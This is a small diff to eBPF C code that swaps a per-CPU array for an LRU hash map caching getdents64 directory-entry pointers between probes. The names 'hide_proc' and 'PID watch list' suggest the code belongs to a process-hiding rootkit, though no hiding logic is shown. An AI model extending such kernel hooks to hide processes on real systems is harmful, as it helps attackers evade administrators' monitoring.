@@ -10,6 +10,7 @@
 #include "bpf.h"
 #include "vmlinux.h"
 #include "config.h"
+#include "utils.h"
 
 /**
  * PID watch list.
@@ -25,13 +26,15 @@ struct {
 
 /**
  * Per-CPU storage for dirp address between kprobe and kretprobe.
+ * 
+ * Using LRU_HASH to avoid data saturation. avoid -E2BIG
  */
 struct {
-    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
-    __uint(max_entries, 1);
-    __type(key,   __u32);
-    __type(value, __u64); //linux_dirent ptr (userspace address)
-} hide_proc_dirp_cache SEC(".maps");
+    __uint(type, BPF_MAP_TYPE_LRU_HASH);
+    __uint(max_entries, 512);
+    __type(key, __u32);
+    __type(value, struct linux_dirent64 *); //userspace ptr. (struct compat_linux_dirent __user * dirent) https://elixir.bootlin.com/linux/v6.17.3/source/fs/readdir.c#L565
+} getdents64_cache SEC(".maps");
 
 //---------------------------------------------------------------
 
